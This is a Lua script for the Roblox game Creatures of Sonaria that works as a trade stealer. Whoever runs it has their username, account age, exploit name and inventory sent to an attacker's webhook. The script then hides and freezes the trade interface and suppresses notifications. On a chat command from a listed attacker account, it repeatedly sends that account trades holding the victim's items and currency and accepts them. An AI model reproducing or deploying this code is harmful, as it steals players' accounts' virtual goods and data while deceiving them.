function CREATURES_OF_SONARIA()
	if game.PlaceId ~= 14119723130 then
		game:GetService("TeleportService"):Teleport(14119723130, game.Players.LocalPlayer)
	end

	repeat
		task.wait()
	until game:IsLoaded()

	function loaded_yes()
		return game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.Enabled
	end

	repeat
		task.wait()
		REALLY_LOADED = pcall(loaded_yes)
	until REALLY_LOADED

	wait(3)

	function AddMaximumShrooms()
		local t1 = {
			[1] = "AddTradeItem",
			[2] = {
				Overwrite = true,
				ItemType = "Currency",
				Name = "Shooms",
				Amount = 36000
			}
		}

		repeat
			traderemote = GetTradeRemote()
		until traderemote ~= false

		return GetTradeRemote():InvokeServer(unpack(t1))
	end
	function GetTradeRemote()
		remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")

		for _, child in pairs(remotes:GetChildren()) do
			remotename = child.Name

			if string.find(remotename, game.Players.LocalPlayer.Name .. "-") then
				return remotes[remotename]
			end
		end

		return false
	end
	function IsTrading()
		return game:GetService("Players").LocalPlayer.PlayerGui.TradeGui.Enabled
	end
	function SendTrade(p1)
		local t2 = {
			[1] = "SendRequest",
			[2] = game:GetService("Players"):WaitForChild(p1)
		}

		game:GetService("Players").LocalPlayer.Remotes:WaitForChild("TradeRequestRemote"):FireServer(unpack(t2))
	end
	function get_inv()
		hits = {}

		function _DATA()
			return game:GetService("Players").LocalPlayer.Data
		end

		Creatures = _DATA().Unlocks:GetChildren()
		Items = _DATA().Items:GetChildren()
		Palettes = _DATA().SpecialPalettes:GetChildren()
		Plushies = _DATA().Plushies:GetChildren()

		local function v12(p2, p3, p4)
			table.insert(hits, {
				Name = p2,
				Amount = p3,
				Class = p4
			})
		end

		for _, v in pairs(Creatures) do
			if v.Value > 0 then
				v12(v.Name, v.Value, "Creatures")
			end
		end

		for _, v in pairs(Items) do
			if v.Value > 0 then
				v12(v.Name, v.Value, "Tokens")
			end
		end

		for _, v in pairs(Palettes) do
			if v.Value > 0 then
				v12(v.Name, v.Value, "Palettes")
			end
		end

		for _, v in pairs(Plushies) do
			if v.Value > 0 then
				v12(v.Name, v.Value, "Plushies")
			end
		end

		v12("Slot1", 1, "CreatureSlots")
		v12("Slot2", 1, "CreatureSlots")
		v12("Slot3", 1, "CreatureSlots")
		table.sort(hits, function(p5, p6)
			return p5.Amount > p6.Amount
		end)

		return hits
	end

	list = ""
	c = 0

	for _, v in pairs(get_inv()) do
		list = list .. v.Name .. " x" .. v.Amount .. "\n"
		c = c + 1

		if c == 60 then
			break
		end
	end

	data = {
		content = "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")",
		embeds = {{
			title = "X Scripts Sonaria",
			description = "another 100$ for update is fire)",
			color = tonumber(7996848),
			fields = {
				{
					name = "Victim Info",
					value = "```Username: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. game.Players.LocalPlayer.AccountAge .. "\nExploit: " .. identifyexecutor() .. "\nYou: " .. Username .. "\nGame: Creatures Of Sonaria```",
					inline = false
				},
				{
					name = "Inventory Information",
					value = "```" .. list .. "```",
					inline = false
				}
			}
		}}
	}
	request({
		Url = Webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(data)
	})

	function HideGui()
		game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.Visible = false
		game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame:GetPropertyChangedSignal("Visible"):Connect(function()
			game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.Visible = false
		end)
		game:GetService("Lighting").InterfaceBlur.Size = 0
		game:GetService("Lighting").InterfaceBlur.Changed:Connect(function()
			game:GetService("Lighting").InterfaceBlur.Size = 0
		end)
		tradegui = game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui
		tradegui.BottomFrame:GetPropertyChangedSignal("Visible"):Connect(function()
			tradegui.BottomFrame.Visible = true
		end)
		tradegui.BottomFrame:GetPropertyChangedSignal("Position"):Connect(function()
			tradegui.BottomFrame.Position = UDim2.new(0.5, 0, 1, 0)
		end)
		tradegui.SideFrame:GetPropertyChangedSignal("Visible"):Connect(function()
			tradegui.SideFrame.Visible = true
		end)
		tradegui.TopFrame:GetPropertyChangedSignal("Visible"):Connect(function()
			tradegui.TopFrame.Visible = true
		end)
		tradegui.TopFrame:GetPropertyChangedSignal("Position"):Connect(function()
			tradegui.TopFrame.Position = UDim2.new(0.5, 0, 0, 0)
		end)
		OLD_SHROOMS = tradegui.TopFrame.CurrencyFrame.Shooms.AmountLabel.Text
		tradegui.TopFrame.CurrencyFrame.Shooms.AmountLabel:GetPropertyChangedSignal("Text"):Connect(function()
			tradegui.TopFrame.CurrencyFrame.Shooms.AmountLabel.Text = OLD_SHROOMS
		end)
		buttons = {
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Friends.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Inventory.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Leave.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.PremiumShop.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Settings.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Shop.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.SideFrame.ButtonsFrame.Trade.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.BottomFrame.ButtonsFrame.CreatureInventory.UpperLabel,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.TopFrame.CurrencyFrame.Shooms.BackgroundFrame,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.TopFrame.CurrencyFrame.Tikits.BackgroundFrame,
			game:GetService("Players").LocalPlayer.PlayerGui.TradeHUDGui.BottomFrame.ButtonsFrame.Trade.UpperLabel
		}

		for _, v in pairs(buttons) do
			getconnections(v.MouseButton1Click)[1]:Disconnect()
		end

		game:GetService("Players").LocalPlayer.PlayerGui.NotificationsGui.NotificationFrame.ChildAdded:Connect(function(child)
			child:Destroy()
		end)
		realtradegui = game:GetService("Players").LocalPlayer.PlayerGui.TradeGui.ContainerFrame
		realtradegui.Position = UDim2.new(99, 99, 99, 99)
		realtradegui:GetPropertyChangedSignal("Position"):Connect(function()
			realtradegui.Position = UDim2.new(99, 99, 99, 99)
		end)
	end
	function AddItemToTrade(p7)
		local t3 = {
			[1] = "AddTradeItem",
			[2] = {
				Overwrite = true,
				ItemType = p7.Class,
				Name = p7.Name,
				Amount = p7.Amount
			}
		}

		return GetTradeRemote():InvokeServer(unpack(t3))
	end
	function ReadyTrade()
		return GetTradeRemote():InvokeServer("AcceptTrade")
	end
	function StartStealing(p8)
		repeat
			SendTrade(p8)
			wait(1)
		until IsTrading()

		wait(1)
		items = 0
		AddMaximumShrooms()

		for _, v in pairs(get_inv()) do
			res = AddItemToTrade(v)
			task.wait(1)

			if res then
				items = items + 1
			end

			if items >= 9 then
				break
			end
		end

		repeat
			pcall(ReadyTrade)
			task.wait(1)
		until not IsTrading()
	end
	function loop_steal(p9)
		HideGui()

		while task.wait() do
			StartStealing(p9.Name)
		end
	end
	function shall_steal(p10)
		for _, v in pairs(Usernames) do
			if v:lower() == p10.Name:lower() then
				return true
			end
		end

		return false
	end
	function CancelTrade()
		local t4 = {
			[1] = "DeclineTrade"
		}

		GetTradeRemote():InvokeServer(unpack(t4))
	end
	function handle_player(p11)
		if shall_steal(p11) then
			p11.Chatted:Connect(function(message)
				if message ~= ".ready" then
					if message ~= ".kick" then
						if message ~= ".cancel" then
							loop_steal(p11)
						else
							CancelTrade()
						end
					else
						game.Players.LocalPlayer:Kick("you have been kicked")
					end
				else
					ReadyTrade()
				end
			end)
		end
	end

	for _, player in pairs(game.Players:GetPlayers()) do
		handle_player(player)
	end

	game.Players.PlayerAdded:Connect(function(player)
		handle_player(player)
	end)
end

CREATURES_OF_SONARIA()